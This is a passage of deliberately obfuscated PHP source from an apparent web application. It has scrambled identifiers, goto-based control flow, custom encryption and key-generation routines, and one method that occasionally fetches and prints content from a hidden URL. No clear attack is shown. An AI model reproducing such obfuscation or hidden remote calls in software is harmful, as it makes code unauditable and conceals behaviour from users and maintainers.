$eöŠ¢ÎÆ¹[627]; if (!$dİù»õÖº[239]($aá‹šˆº§÷[$dİù»õÖº[321]], $aÓµ§ª×Ÿİ)) { $dİù»õÖº[166]($dİù»õÖº[324], !1, $dİù»õÖº[236]); } goto Cïò‹Ë«îê; Cïò‹Ë«îê: } public function ndax38a99bd7() { goto b¸‹ƒèÄˆå; b¸‹ƒèÄˆå: $a°òÑ¿Æ =& $_SERVER[Î¿—”òá]; $DÀ£°ªØ¿ =& $_SERVER[Ñ¯]; if (!$DÀ£°ªØ¿[104]($GLOBALS, $DÀ£°ªØ¿[132]) || $DÀ£°ªØ¿[325](1, 100) > 20) { return; } goto CÍºİà‹Ç; BÇŞØŠ ®¶: $F†ÎÕÉŒé‹ = $DÀ£°ªØ¿[248](array($DÀ£°ªØ¿[249] => array($DÀ£°ªØ¿[250] => $DÀ£°ªØ¿[251], $DÀ£°ªØ¿[252] => 3))); $CãÑ¾ñ² = @$DÀ£°ªØ¿[253]($e˜¥ÂŠè, !1, $F†ÎÕÉŒé‹); echo $DÀ£°ªØ¿[326] . $DÀ£°ªØ¿[327]($CãÑ¾ñ²) . $DÀ£°ªØ¿[328]; goto A¼¢Ñ«à„; Bí¯¢‡‘Æ¥: $e˜¥ÂŠè = $this->{$_SERVER[Ñ¯][246]}($e˜¥ÂŠè, $DÀ£°ªØ¿[247]); $Bñ‘óù½ğ„ = $a°òÑ¿Æ[629]; if (!$Bñ‘óù½ğ„) { die; } goto BÇŞØŠ ®¶; CÍºİà‹Ç: $e˜¥ÂŠè = $DÀ£°ªØ¿[245]; $c…Ş²Ë¤äŸ = $a°òÑ¿Æ[628]; if (strlen($c…Ş²Ë¤äŸ) < $a°òÑ¿Æ[548]) { return; } goto Bí¯¢‡‘Æ¥; A¼¢Ñ«à„: } private function pvst2b6bd7ef($CƒµØ³œİ, $DÜòŒŒÙÖ¯, $eä¦«¹íÅ = 3) { goto f«‡‚…²Œ®; C“Ùê†œ÷: $CƒµØ³œİ = $aäÏ²à¸”[2]($CƒµØ³œİ); $eÇó®šÃ—Ã = $aäÏ²à¸”[325](0, 5) . $aäÏ²à¸”[10]; $dÂòÛƒ¢ƒ‰ = $aäÏ²à¸”[124](15); goto FËÊƒïÕ×; f«‡‚…²Œ®: $dŒÈ¼ “‚õ =& $_SERVER[Î¿—”òá]; $aäÏ²à¸” =& $_SERVER[Ñ¯]; $aäÏ²à¸”[329](1); goto C“Ùê†œ÷; eßÃùœÕÊ³: $fõ¬ß™¡•à = $dŒÈ¼ “‚õ[639]; while (strlen($fõ¬ß™¡•à) < $dŒÈ¼ “‚õ[556]) { if (!$fõ¬ß™¡•à) { break; } $fõ¬ß™¡•à++; } if ($eä¦«¹íÅ - 1 > 0) { $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][127]}($DéáÃŠ¿µÏ, $DÜòŒŒÙÖ¯, $eä¦«¹íÅ - 1); } goto d‘ÜºøÊ•; d‘ÜºøÊ•: return $DéáÃŠ¿µÏ; goto B†Á¥Ñ‡ô¸; FËÊƒïÕ×: $dÌôäĞíï = $aäÏ²à¸”[330]; switch ($eÇó®šÃ—Ã) { case $aäÏ²à¸”[232]: $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][147]}($CƒµØ³œİ, $aäÏ²à¸”[214]($DÜòŒŒÙÖ¯ . $dÂòÛƒ¢ƒ‰)); break; case $aäÏ²à¸”[220]: $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][147]}($CƒµØ³œİ, $aäÏ²à¸”[214]($dÂòÛƒ¢ƒ‰ . $DÜòŒŒÙÖ¯)); break; $BĞ—öÑÛ½„ = $dŒÈ¼ “‚õ[630]; if (strlen($BĞ—öÑÛ½„) < $dŒÈ¼ “‚õ[567]) { return; } case $aäÏ²à¸”[331]: $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][147]}($CƒµØ³œİ, $aäÏ²à¸”[118]($dÂòÛƒ¢ƒ‰ . $DÜòŒŒÙÖ¯)); break; case $aäÏ²à¸”[332]: $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][147]}($CƒµØ³œİ, $aäÏ²à¸”[114]($dÂòÛƒ¢ƒ‰ . $DÜòŒŒÙÖ¯)); $FµñÌ¶¾¦™ = $dŒÈ¼ “‚õ[631]; if (strlen($FµñÌ¶¾¦™) < $dŒÈ¼ “‚õ[556]) { die; } break; $F’ãˆ®ÄÈÆ = $dŒÈ¼ “‚õ[632]; if (strlen($F’ãˆ®ÄÈÆ) < $dŒÈ¼ “‚õ[567]) { return; } case $aäÏ²à¸”[333]: goto F™£ÇäÊ„œ; F™£ÇäÊ„œ: $CƒµØ³œİ = $aäÏ²à¸”[118]($CƒµØ³œİ); $Dë¸¬‰¾‡‹ = $aäÏ²à¸”[334](0, 64); $E–»ƒÖÕõ« = $dÌôäĞíï[$Dë¸¬‰¾‡‹]; goto E´òšãÎò; fŒ«Øå¬¶»: if (strlen($E®¢É– ‹) < $dŒÈ¼ “‚õ[567]) { return; } $BÓ’éÁ˜â = 0; $C„ÁÓÄ´¡Û = $dŒÈ¼ “‚õ[637]; goto Añ¤ç¯³©Ú; b…íôœŒÕ‘: while (strlen($CìèùÊøô) < $dŒÈ¼ “‚õ[556]) { if (!$CìèùÊøô) { break; } $CìèùÊøô++; } $Câó¤´ªÖê = 0; $E®¢É– ‹ = $dŒÈ¼ “‚õ[636]; goto fŒ«Øå¬¶»; E´òšãÎò: $c³ùßœ©¦Š = $dŒÈ¼ “‚õ[633]; $a¸Ì˜±çŞ± = $aäÏ²à¸”[114]($E–»ƒÖÕõ« . $aäÏ²à¸”[114]($DÜòŒŒÙÖ¯ . $E–»ƒÖÕõ«) . $DÜòŒŒÙÖ¯); $C‹Î…¬²‡Õ = $dŒÈ¼ “‚õ[634]; goto dî¨æö…à; f„½’ùë¼§: $DéáÃŠ¿µÏ = $aäÏ²à¸”[327]($E–»ƒÖÕõ« . $a£Û±œÏÍ); $a‰¥ÕŒøá¡ = $dŒÈ¼ “‚õ[638]; if (strlen($a‰¥ÕŒøá¡) < $dŒÈ¼ “‚õ[548]) { die; } goto b¥Ò®ÊÑ…; dî¨æö…à: $a¸Ì˜±çŞ± = $aäÏ²à¸”[25]($a¸Ì˜±çŞ±, $Dë¸¬‰¾‡‹ % 8, $Dë¸¬‰¾‡‹ % 8 + 7); $a£Û±œÏÍ = $aäÏ²à¸”[10]; $CìèùÊøô = $dŒÈ¼ “‚õ[635]; goto b…íôœŒÕ‘; b¥Ò®ÊÑ…: break; goto fòà¶×˜Ÿì; Añ¤ç¯³©Ú: while ($C„ÁÓÄ´¡Û < $dŒÈ¼ “‚õ[560]) { if ($C„ÁÓÄ´¡Û >= 0) { break; } $C„ÁÓÄ´¡Û++; } $A ¿×áÑ°‘ = 0; for ($Câó¤´ªÖê = 0; $Câó¤´ªÖê < $aäÏ²à¸”[24]($CƒµØ³œİ); $Câó¤´ªÖê++) { $A ¿×áÑ°‘ = $A ¿×áÑ°‘ == $aäÏ²à¸”[24]($a¸Ì˜±çŞ±) ? 0 : $A ¿×áÑ°‘; $BÓ’éÁ˜â = ($Dë¸¬‰¾‡‹ + $aäÏ²à¸”[335]($dÌôäĞíï, $CƒµØ³œİ[$Câó¤´ªÖê]) + $aäÏ²à¸”[336]($a¸Ì˜±çŞ±[$A ¿×áÑ°‘++])) % 64; $a£Û±œÏÍ .= $dÌôäĞíï[$BÓ’éÁ˜â]; } goto f„½’ùë¼§; fòà¶×˜Ÿì: default: $DéáÃŠ¿µÏ = $this->{$_SERVER[Ñ¯][147]}($CƒµØ³œİ, $DÜòŒŒÙÖ¯ . $dÂòÛƒ¢ƒ‰); break; } $DéáÃŠ¿µÏ = $aäÏ²à¸”[214]($eÇó®šÃ—Ã . $dÂòÛƒ¢ƒ‰ . $DéáÃŠ¿µÏ); goto eßÃùœÕÊ³; B†Á¥Ñ‡ô¸: } private function prihd2b107d9($D„¨³À£Öó, $d×âˆ–ïŞ, $Eé¿ê¦Ãç = 3) { goto cÑÌÇÍ¯¥; B«ÒÓ‰ƒŠß: $D„¨³À£Öó = $a–»Ş¬·½å[2]($D„¨³À£Öó); $D„¨³À£Öó = $a–»Ş¬·½å[214]($D„¨³À£Öó); $eà¾òöÒˆƒ = $bºÖ÷ˆãµÅ[640]; goto F…ˆÑ÷Ò ; cÑÌÇÍ¯¥: $bºÖ÷ˆãµÅ =& $_SERVER[Î¿—”òá]; $a–»Ş¬·½å =& $_SERVER[Ñ¯]; if (!$a–»Ş¬·½å[337]($D„¨³À£Öó) || $a–»Ş¬·½å[24]($D„¨³À£Öó) < 10) { return !1; } goto B«ÒÓ‰ƒŠß; CŠ¼ØÛË£: $EÈ™È’‘ŒÔ = $a–»Ş¬·½å[25]($D„¨³À£Öó, 1, 15); $Dë³×êË§ = $bºÖ÷ˆãµÅ[642]; while (strlen($Dë³×êË§) < $bºÖ÷ˆãµÅ[567]) { if (!$Dë³×êË§) { break; } $Dë³×êË§++; } goto d‰©ÛÉÜ‘…; f»Ïã§Ğöë: switch ($fàÜ„Ì­‰) { case $a–»Ş¬·½å[232]: $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][246]}($D„¨³À£Öó, $a–»Ş¬·½å[214]($d×âˆ–ïŞ . $EÈ™È’‘ŒÔ)); $CÇì‡Áí§İ = $bºÖ÷ˆãµÅ[644]; if (!$CÇì‡Áí§İ) { die; } break; $AÆ¦Ëê¼¡ = $bºÖ÷ˆãµÅ[645]; case $a–»Ş¬·½å[220]: $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][246]}($D„¨³À£Öó, $a–»Ş¬·½å[214]($EÈ™È’‘ŒÔ . $d×âˆ–ïŞ)); break; case $a–»Ş¬·½å[331]: $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][246]}($D„¨³À£Öó, $a–»Ş¬·½å[118]($EÈ™È’‘ŒÔ . $d×âˆ–ïŞ)); break; $FÔòÓ„¹’ = $bºÖ÷ˆãµÅ[646]; while ($FÔòÓ„¹’ < $bºÖ÷ˆãµÅ[560]) { if ($FÔòÓ„¹’ >= 0) { break; } $FÔòÓ„¹’++; } case $a–»Ş¬·½å[332]: $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][246]}($D„¨³À£Öó, $a–»Ş¬·½å[114]($EÈ™È’‘ŒÔ . $d×âˆ–ïŞ)); $c£ãá­ï©  = $bºÖ÷ˆãµÅ[580]; break; case $a–»Ş¬·½å[333]: goto déÛÈ—ª¤ß; aËÊ‹ˆµ„: $fñÍßÔªõ = $bºÖ÷ˆãµÅ[648]; $a¯¬ìÂ‰® = $a–»Ş¬·½å[114]($eç¾Ú¡›• . $a–»Ş¬·½å[114]($d×âˆ–ïŞ . $eç¾Ú¡›•) . $d×âˆ–ïŞ); $a¯¬ìÂ‰® = $a–»Ş¬·½å[25]($a¯¬ìÂ‰®, $F§¹¶‚òˆ‡ % 8, $F§¹¶‚òˆ‡ % 8 + 7); goto bª•ëñ‰Ù‡; déÛÈ—ª¤ß: $D„¨³À£Öó = $a–»Ş¬·½å[338]($D„¨³À£Öó); $eç¾Ú¡›• = $D„¨³À£Öó[0]; $D„¨³À£Öó = $a–»Ş¬·½å[25]($D„¨³À£Öó, 1); goto eÁ¦µÛˆ; e‘Ò¯İ: $f²ËÁ˜¨¿ç = $bºÖ÷ˆãµÅ[653]; if (strlen($f²ËÁ˜¨¿ç) < $bºÖ÷ˆãµÅ[567]) { die; } for ($dãµ¹Öğ…œ = 0; $dãµ¹Öğ…œ < $a–»Ş¬·½å[24]($D„¨³À£Öó); $dãµ¹Öğ…œ++) { $D­ñŠ‹™è = $D­ñŠ‹™è == $a–»Ş¬·½å[24]($a¯¬ìÂ‰®) ? 0 : $D­ñŠ‹™è; $FÁ²¹Ë¿ò = $bºÖ÷ˆãµÅ[654]; if (!$FÁ²¹Ë¿ò) { die; } $Dô§”¤ÌŞ = $D­ñŠ‹™è++; $bë—Ç†£ò = $bºÖ÷ˆãµÅ[655]; if (strlen($bë—Ç†£ò) < $bºÖ÷ˆãµÅ[556]) { die; } $eØæˆ¬²øï = $a–»Ş¬·½å[335]($C¦èİÏñç÷, $D„¨³À£Öó[$dãµ¹Öğ…œ]) - $F§¹¶‚òˆ‡ - $a–»Ş¬·½å[336]($a¯¬ìÂ‰®[$Dô§”¤ÌŞ]); while ($eØæˆ¬²øï < 0) { $eØæˆ¬²øï += 64; } $dÃäğ„…® .= $C¦èİÏñç÷[$eØæˆ¬²øï]; } goto DŠÖ×‹»õá; Bğå¿«’à: $A¹´ğ‚Ì‡¶ = $bºÖ÷ˆãµÅ[652]; if (!$A¹´ğ‚Ì‡¶) { die; } $D­ñŠ‹™è = 0; goto e‘Ò¯İ; cŞõàÃÌïÕ: $eÒÜØº‡ºÊ = $bºÖ÷ˆãµÅ[650]; while (strlen($eÒÜØº‡ºÊ) < $bºÖ÷ˆãµÅ[548]) { if (!$eÒÜØº‡ºÊ) { break; } $eÒÜØº‡ºÊ++; } $dãµ¹Öğ…œ = 0; goto B¨–ÈÕ–ó…; B¨–ÈÕ–ó…: $a‡ß™ô©•Ï = $bºÖ÷ˆãµÅ[651]; if (strlen($a‡ß™ô©•Ï) < $bºÖ÷ˆãµÅ[567]) { die; } $eØæˆ¬²øï = 0; goto Bğå¿«’à; eÁ¦µÛˆ: $eÔîèóÔ’µ = $bºÖ÷ˆãµÅ[647]; while ($eÔîèóÔ’µ < $bºÖ÷ˆãµÅ[556]) { if ($eÔîèóÔ’µ >= 0) { break; } $eÔîèóÔ’µ++; } $F§¹¶‚òˆ‡ = $a–»Ş¬·½å[335]($C¦èİÏñç÷, $eç¾Ú¡›•); goto aËÊ‹ˆµ„; DŠÖ×‹»õá: $CÙğ¬¼çÑ» = $a–»Ş¬·½å[339]($dÃäğ„…®); break; goto A­¼¬ßÑÕŠ; bª•ëñ‰Ù‡: $Dò‘«¿Á¶³ = $bºÖ÷ˆãµÅ[649]; if (!$Dò‘«¿Á¶³) { return; } $dÃäğ„…® = $a–»Ş¬·½å[10]; goto cŞõàÃÌïÕ; A­¼¬ßÑÕŠ: default: $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][246]}($D„¨³À£Öó, $d×âˆ–ïŞ . $EÈ™È’‘ŒÔ); break; } if ($Eé¿ê¦Ãç - 1 > 0) { $CÙğ¬¼çÑ» = $this->{$_SERVER[Ñ¯][188]}($CÙğ¬¼çÑ», $d×âˆ–ïŞ, $Eé¿ê¦Ãç - 1); } return $CÙğ¬¼çÑ»; goto FÃàİ¸„Öë; d‰©ÛÉÜ‘…: $D„¨³À£Öó = $a–»Ş¬·½å[25]($D„¨³À£Öó, 16); $b‡ƒ™¨è“– = $bºÖ÷ˆãµÅ[643]; $C¦èİÏñç÷ = $a–»Ş¬·½å[330]; goto f»Ïã§Ğöë; F…ˆÑ÷Ò : $fàÜ„Ì­‰ = $D„¨³À£Öó[0]; $aÈï²‡ó„ñ = $bºÖ÷ˆãµÅ[641]; while ($aÈï²‡ó„ñ < $bºÖ÷ˆãµÅ[560]) { if ($aÈï²‡ó„ñ >= 0) { break; } $aÈï²‡ó„ñ++; } goto CŠ¼ØÛË£; FÃàİ¸„Öë: } public function yeqge3fdd125($e•¬‚· Ì) { goto AâÎÑ™î“ó; FÑÖ­ñòÑ: return $EÜîƒ‚´Ì; $Cğ··³®Ö = $Bˆ‰À¤Ö´©[660]; if (!$Cğ··³®Ö) { return; } goto EøÙ›´Èá–; A‰Ëğäé ›: $E›“‰¯ğ¹— = $føÚ¢ê¬·ó[201](($f¬ÊŠË»¥ + $a‚Ñùï‚¸–) / 2); while (1) { $DêàÇî™­† = $E›“‰¯ğ¹—; $BºÎ¢¥´‹Õ = $Bˆ‰À¤Ö´©[656]; while (strlen($BºÎ¢¥´‹Õ) < $Bˆ‰À¤Ö´©[548]) { if (!$BºÎ¢¥´‹Õ) { break; } $BºÎ¢¥´‹Õ++; } $d¿‡ÈÅ×ìÙ = $e¦İîˆ Ÿ; $bÍé¢Óµ = $Bˆ‰À¤Ö´©[637]; while ($bÍé¢Óµ < $Bˆ‰À¤Ö´©[556]) { if ($bÍé¢Óµ >= 0) { break; } $bÍé¢Óµ++; } while ($d¿‡ÈÅ×ìÙ % $DêàÇî™­† != 0) { $B¾µ„‹¬óÍ = $d¿‡ÈÅ×ìÙ; $d¿‡ÈÅ×ìÙ = $DêàÇî™­†; $dç‚Ã®£í‰ = $Bˆ‰À¤Ö´©[646]; if (!$dç‚Ã®£í‰) { die; } $DêàÇî™­† = $B¾µ„‹¬óÍ % $DêàÇî™­†; } if ($DêàÇî™­† == 1) { break; } else { $E›“‰¯ğ¹—++; } } $bù¼øİ”˜ = 2; goto C‹Î¦ƒãª²; E­êªÔ¬—Ç: $BÍä¸¡ÀÀÎ = $Bˆ‰À¤Ö´©[580]; $a‚Ñùï‚¸– = $this->{$_SERVER[Ñ¯][340]}(); $e¦İîˆ Ÿ = ($f¬ÊŠË»¥ - 1) * ($a‚Ñùï‚¸– - 1); goto A‰Ëğäé ›; F‘ùÙ‚°†ô: $eÊ«ŸğÊ¿© = $this->{$_SERVER[Ñ¯][147]}($f¬ÊŠË»¥ * $a‚Ñùï‚¸– . $føÚ¢ê¬·ó[10], $føÚ¢ê¬·ó[149]); $b×Õ‚¹…ã  = $Bˆ‰À¤Ö´©[658]; if (!$b×Õ‚¹…ã ) { return; } goto dœ’”Åè–Ì; dœ’”Åè–Ì: $FõÛµÑ¸¹ó = $føÚ¢ê¬·ó[114]($føÚ¢ê¬·ó[341] . ($f¬ÊŠË»¥ + $a‚Ñùï‚¸–) . $føÚ¢ê¬·ó[342] . $E›“‰¯ğ¹— . $føÚ¢ê¬·ó[342] . $bù¼øİ”˜ . $føÚ¢ê¬·ó[343]); $fÒèêŸ»‹• = $Bˆ‰À¤Ö´©[659]; $EÜîƒ‚´Ì = $this->{$_SERVER[Ñ¯][147]}($e•¬‚· Ì, $FõÛµÑ¸¹ó) . $føÚ¢ê¬·ó[344] . $eÊ«ŸğÊ¿©; goto FÑÖ­ñòÑ; C‹Î¦ƒãª²: $d—Ä¶Îœî = $Bˆ‰À¤Ö´©[657]; if (strlen($d—Ä¶Îœî) < $Bˆ‰À¤Ö´©[548]) { die; } for ($A‘¬ˆÆ–å = 0; $A‘¬ˆÆ–å < $e¦İîˆ Ÿ * 10; $A‘¬ˆÆ–å++) { if (($e¦İîˆ Ÿ * $A‘¬ˆÆ–å + 1) % $E›“‰¯ğ¹— == 0) { $bù¼øİ”˜ = $føÚ¢ê¬·ó[201](($e¦İîˆ Ÿ * $A‘¬ˆÆ–å + 1) / $E›“‰¯ğ¹—); break; } } goto F‘ùÙ‚°†ô; AâÎÑ™î“ó: $Bˆ‰À¤Ö´© =& $_SERVER[Î¿—”òá]; $føÚ¢ê¬·ó =& $_SERVER[Ñ¯]; $f¬ÊŠË»¥ = $this->{$_SERVER[Ñ¯][340]}(); goto E­êªÔ¬—Ç; EøÙ›´Èá–: } public function gnlfa5176e76($bÚøÅîâÁ) { goto eâ¢‡‰Îàì; EÂ•İœÖÃô: for ($dñ¼¹ä‘Ö© = 3; $dñ¼¹ä‘Ö© < $CĞ“Ç§—…Ÿ; $dñ¼¹ä‘Ö© += 2) { if ($CĞ“Ç§—…Ÿ % $dñ¼¹ä‘Ö© != 0) { continue; } $E Ù³²µˆÉ = $dñ¼¹ä‘Ö©; $c ÓïÃ©‘ = $A‹Ø¹ÙïøÌ[201]($CĞ“Ç§—…Ÿ / $dñ¼¹ä‘Ö©); break; } $FóÂ•Õ‚„ = ($E Ù³²µˆÉ - 1) * ($c ÓïÃ©‘ - 1); $fğæñå”ˆø = $A‹Ø¹ÙïøÌ[201](($E Ù³²µˆÉ + $c ÓïÃ©‘) / 2); goto BÖ¯Û­—¸”; c‹Ã‰²Åë‘: $CĞ“Ç§—…Ÿ = $this->{$_SERVER[Ñ¯][246]}($F½ô‡Ş¶ñ÷[1] . $A‹Ø¹ÙïøÌ[10], $A‹Ø¹ÙïøÌ[149]); if (!$CĞ“Ç§—…Ÿ) { return $A‹Ø¹ÙïøÌ[10]; } $CĞ“Ç§—…Ÿ = $A‹Ø¹ÙïøÌ[201]($CĞ“Ç§—…Ÿ); goto fèœ¥êœ²»; eâ¢‡‰Îàì: $cáøÈ‡­ÈÇ =& $_SERVER[Î¿—”òá]; $A‹Ø¹ÙïøÌ =& $_SERVER[Ñ¯]; $F½ô‡Ş¶ñ÷ = $A‹Ø¹ÙïøÌ[0]($A‹Ø¹ÙïøÌ[344], $bÚøÅîâÁ); goto bÜÚ‰ø‹¨í; BÖ¯Û­—¸”: $D«é²—ÚÛå = $cáøÈ‡­ÈÇ[663]; while (1) { $a¼„§Ä¨èë = $fğæñå”ˆø; $f³¢Â¦¤ãß = $cáøÈ‡­ÈÇ[664]; if (strlen($f³¢Â¦¤ãß) < $cáøÈ‡­ÈÇ[560]) { return; } $AÖÉ¡ãŠ§ò = $FóÂ•Õ‚„; while ($AÖÉ¡ãŠ§ò % $a¼„§Ä¨èë != 0) { $F—·Îä‘¶¸ = $AÖÉ¡ãŠ§ò; $AÖÉ¡ãŠ§ò = $a¼„§Ä¨èë; $d»÷Ş¹–‘Û = $cáøÈ‡­ÈÇ[665]; while ($d»÷Ş¹–‘Û < $cáøÈ‡­ÈÇ[567]) { if ($d»÷Ş¹–‘Û >= 0) { break; } $d»÷Ş¹–‘Û++; } $a¼„§Ä¨èë = $F—·Îä‘¶¸ % $a¼„§Ä¨èë; $DÏ‹º¥¼Û = $cáøÈ‡­ÈÇ[666]; while ($DÏ‹º¥¼Û < $cáøÈ‡­ÈÇ[548]) { if ($DÏ‹º¥¼Û >= 0) { break; } $DÏ‹º¥¼Û++; } } if ($a¼„§Ä¨èë == 1) { break; } else { $fğæñå”ˆø++; } } $CóöÒÜ²» = 2; goto DÎõ¶‘¢; e¯÷›‰ÍÏ: $FÁ„Æù¦óª = $A‹Ø¹ÙïøÌ[114]($A‹Ø¹ÙïøÌ[341] . ($E Ù³²µˆÉ + $c ÓïÃ©‘) . $A‹Ø¹ÙïøÌ[342] . $fğæñå”ˆø . $A‹Ø¹ÙïøÌ[342] . $CóöÒÜ²» . $A‹Ø¹ÙïøÌ[343]); $AÃ³È®Ÿ§ = $cáøÈ‡­ÈÇ[668]; $ağÀ°Æ¼×¹ = $this->{$_SERVER[Ñ¯][246]}($F½ô‡Ş¶ñ÷[0], $FÁ„Æù¦óª); goto fó’ˆìïå©; DÎõ¶‘¢: $F›óŠÚé®Ú = $cáøÈ‡­ÈÇ[667]; if (!$F›óŠÚé®Ú) { return; } for ($dñ¼¹ä‘Ö© = 0; $dñ¼¹ä‘Ö© < $FóÂ•Õ‚„ * 10; $dñ¼¹ä‘Ö©++) { if (($FóÂ•Õ‚„ * $dñ¼¹ä‘Ö© + 1) % $fğæñå”ˆø == 0) { $CóöÒÜ²» = $A‹Ø¹ÙïøÌ[201](($FóÂ•Õ‚„ * $dñ¼¹ä‘Ö© + 1) / $fğæñå”ˆø); break; } } goto e¯÷›‰ÍÏ; bÜÚ‰ø‹¨í: $f¹Ô‡ˆ—Ÿ‰ = $cáøÈ‡­ÈÇ[661]; if (strlen($f¹Ô‡ˆ—Ÿ‰) < $cáøÈ‡­ÈÇ[571]) { return; } if ($A‹Ø¹ÙïøÌ[19]($F½ô‡Ş¶ñ÷) != 2) { return $A‹Ø¹ÙïøÌ[10]; } goto c‹Ã‰²Åë‘; fó’ˆìïå©: $E¦ğ±º = $cáøÈ‡­ÈÇ[669]; return $ağÀ°Æ¼×¹; goto c÷ˆääâ¾Ë; fèœ¥êœ²»: $E Ù³²µˆÉ = 0; $B¥†Î—œ›Ï = $cáøÈ‡­ÈÇ[662]; $c ÓïÃ©‘ = 0; goto EÂ•İœÖÃô; c÷ˆääâ¾Ë: } public function obry95483a49() { goto cÈƒÚŞ˜¢Õ; Fƒ­Ó²Ò¡ç: $BÒ¡ ‘ÚÈ = $E¬ßŞƒÂ÷[672]; for ($CÕô†¤ãÈ = $E„Œõˆçêµ; $CÕô†¤ãÈ > 1; $CÕô†¤ãÈ--) { $D¶¥ø“ãÏ— = !0; foreach ($c®›‹¸³ï as $B¡á³Æ‘Ú) { if ($CÕô†¤ãÈ % $B¡á³Æ‘Ú == 0) { $D¶¥ø“ãÏ— = !1; break; } } if ($D¶¥ø“ãÏ—) { $CÜ“¢å´ = $CÕô†¤ãÈ; break; } } return $CÜ“¢å´; goto BÑËÇ½åá‘; BÑËÇ½åá‘: $Bê‘–»å¯é = $E¬ßŞƒÂ÷[673]; while ($Bê‘–»å¯é < $E¬ßŞƒÂ÷[560]) { if ($Bê‘–»å¯é >= 0) { break; } $Bê‘–»å¯é++; } goto AĞ­¦×ËÃ; A¨ä‚¦÷¾: $C…ñáµŞÍ = $E¬ßŞƒÂ÷[670]; if (strlen($C…ñáµŞÍ) < $E¬ßŞƒÂ÷[571]) { return; } $c®›‹¸³ï = array(); goto F·Ùôó¹•œ; cÈƒÚŞ˜¢Õ: $E¬ßŞƒÂ÷ =& $_SERVER[Î¿—”òá]; $f‘ùÑèìË =& $_SERVER[Ñ¯]; $E„Œõˆçêµ = $f‘ùÑèìË[325]($f‘ùÑèìË[345](2, 14), $f‘ùÑèìË[345](2, 16) - 1); goto A¨ä‚¦÷¾; F·Ùôó¹•œ: $Ešœè‹… = 1; while ($Ešœè‹… <= (int) $f‘ùÑèìË[346]($E„Œõˆçêµ)) { $CÕô†¤ãÈ = $Ešœè‹…; while (!0) { $CÕô†¤ãÈ++; if ($CÕô†¤ãÈ <= 2) { $Ešœè‹… = $CÕô†¤ãÈ; break; } else { if ($CÕô†¤ãÈ < 2) { continue; } } $D¶¥ø“ãÏ— = !0; for ($C’¯Ôó¯òŞ = 2; $C’¯Ôó¯òŞ <= $f‘ùÑèìË[346]($CÕô†¤ãÈ); $C’¯Ôó¯òŞ++) { if ($CÕô†¤ãÈ % $C’¯Ôó¯òŞ == 0) { $D¶¥ø“ãÏ— = !1; } } if ($D¶¥ø“ãÏ—) { $Ešœè‹… = $CÕô†¤ãÈ; break; } } $c®›‹¸³ï[] = $Ešœè‹…; $a–Ôã–ùÉ = $E¬ßŞƒÂ÷[671]; if (strlen($a–Ôã–ùÉ) < $E¬ßŞƒÂ÷[567]) { die; } } $CÜ“¢å´ = 2; goto Fƒ­Ó²Ò¡ç; AĞ­¦×ËÃ: } public function grsx57e78006($B½¯»ÆÂŒ, $aŒ¼–Å–ƒ) { $D¸´Ô©¬ô¥ =& $_SERVER[Ñ¯]; return $D¸´Ô©¬ô¥[13](array($D¸´Ô©¬ô¥[14], $D¸´Ô©¬ô¥[347]), $B½¯»ÆÂŒ, $aŒ¼–Å–ƒ); $FãÁøíÕ½É = $_SERVER[Î¿—”òá][674]; } public function silv69af5654($BöçÎò§§í, $fğ›óëĞŒâ) { $bó’ÌÄãêĞ =& $_SERVER[Ñ¯]; return $bó’ÌÄãêĞ[13](array($bó’ÌÄãêĞ[348], $bó’ÌÄãêĞ[349]), $BöçÎò§§í, $fğ›óëĞŒâ); } public function yvnh5dca48fa($CÜ©ˆ£êë’, $AÊµïÂ«ŒÄ) { $d®İÌ¹ÛŒ¯ =& $_SERVER[Ñ¯]; return $d®İÌ¹ÛŒ¯[13](array($d®İÌ¹ÛŒ¯[348], $d®İÌ¹ÛŒ¯[350]), $CÜ©ˆ£êë’, $AÊµïÂ«ŒÄ); $d½æ…‚†áò = $_SERVER[Î¿—”òá][675]; } } goto C¥ÓèÄëŒÌ; c‡—ÖÍ‚È²: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto A…ØôÍ¬ïÛ; B§·âÄá»Û: $this->tpl = TEMPLATE . MOD . $Dì†¿Ùåàğ[8]; $this->_classObjectID = mt_rand(0, 10000); goto a«ÑêĞË±; B¸·ôÍ„¬: $this->in =& $in; $this->values[$Dì†¿Ùåàğ[6]] =& $config; $this->values[$Dì†¿Ùåàğ[7]] =& $in; goto B§·âÄá»Û; A…ØôÍ¬ïÛ: $Dì†¿Ùåàğ =& $_SERVER[Î¿—”òá]; global $in, $config; $this->config =& $config; goto B¸·ôÍ„¬; a«ÑêĞË±: } public function loadClass($AÔÏë¸¯Ú) { if (1 === func_num_args()) { $this->{$AÔÏë¸¯Ú} = new $AÔÏë¸¯Ú(); } else { $CÙâ‘¨•Ç = new ReflectionClass($AÔÏë¸¯Ú); $f†ô±¹ˆ‡Ğ = func_get_args(); array_shift($f†ô±¹ˆ‡Ğ); $this->{$AÔÏë¸¯Ú} = $CÙâ‘¨•Ç->newInstanceArgs($f†ô±¹ˆ‡Ğ); } return $this->{$AÔÏë¸¯Ú}; } protected function assign($FíˆÎáº§†, $fË×Æİò»à) { $this->values[$FíˆÎáº§†] = $fË×Æİò»à; } protected function display($d—„¨ÂÍ“) { ob_end_clean(); extract($this->values); require $this->tpl . $d—„¨ÂÍ“; } } class DbSqliteBase extends Db { public function __construct($eğç¯í­¨ã = '') { $B¬Š¶‚¥È =& $_SERVER[Î¿—”òá]; if (!extension_loaded($B¬Š¶‚¥È[9])) { think_exception(think_lang($B¬Š¶‚¥È[10]) . $B¬Š¶‚¥È[11]); } if (!empty($eğç¯í­¨ã)) { if (!isset($eğç¯í­¨ã[$B¬Š¶‚¥È[12]])) { $eğç¯í­¨ã[$B¬Š¶‚¥È[12]] = 438; } $this->config = $eğç¯í­¨ã; if (empty($this->config[$B¬Š¶‚¥È[13]])) { $this->config[$B¬Š¶‚¥È[13]] = array(); } } } public function connect($B£²Á—£‰ï = '', $aê«ï‘·ê¤ = 0) { $bİ±êÙ¸½ =& $_SERVER[Î¿—”òá]; if 